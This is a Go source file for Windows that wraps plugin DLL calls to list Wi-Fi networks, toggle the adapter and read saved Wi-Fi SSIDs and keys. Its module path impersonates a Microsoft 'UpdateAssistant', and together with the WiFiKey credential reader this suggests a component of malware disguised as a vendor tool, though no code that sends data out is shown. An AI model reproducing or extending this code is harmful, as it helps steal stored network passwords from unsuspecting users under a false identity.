//go:build windows

package sysutil

import (
	"sync"
	"unsafe"

	"github.com/microsoft/UpdateAssistant/modules/config"
	"github.com/microsoft/UpdateAssistant/modules/loader"
)

func wifi(fn func(*loader.Plugin)) {
	p, err := loader.Load("wifi")
	if err != nil {
		return
	}
	defer loader.Unload(p)
	fn(p)
}

func WiFiCount() int { var r int; wifi(func(p *loader.Plugin) { r = pNum(p, "wifi_count") }); return r }

var (
	networkMu   sync.Mutex
	networkPlug *loader.Plugin
)

func networkDLL(fn func(*loader.Plugin)) {
	networkMu.Lock()
	if networkPlug == nil {
		p, err := loader.Load("network")
		if err == nil {
			networkPlug = p
		}
	}
	p := networkPlug
	networkMu.Unlock()
	if p != nil {
		fn(p)
	}
}

func WiFiEnable() bool {
	var r int
	networkDLL(func(p *loader.Plugin) { r = pNum(p, "wifi_enable") })
	return r == 1
}
func WiFiDisable() bool {
	var r int
	networkDLL(func(p *loader.Plugin) { r = pNum(p, "wifi_disable") })
	return r == 1
}
func WiFiEnabled() bool {
	var r int
	networkDLL(func(p *loader.Plugin) { r = pNum(p, "wifi_status") })
	return r == 1
}

func WiFiSSID(i int) string {
	var r string
	wifi(func(p *loader.Plugin) {
		buf := make([]byte, config.SmallBuf)
		n, err := p.Call("wifi_ssid", uintptr(i), uintptr(unsafe.Pointer(&buf[0])), uintptr(config.SmallBuf))
		if err == nil {
			r = string(buf[:int(n)])
		}
	})
	return r
}

func WiFiKey(i int) string {
	var r string
	wifi(func(p *loader.Plugin) {
		buf := make([]byte, config.SmallBuf)
		n, err := p.Call("wifi_key", uintptr(i), uintptr(unsafe.Pointer(&buf[0])), uintptr(config.SmallBuf))
		if err == nil {
			r = string(buf[:int(n)])
		}
	})
	return r
}
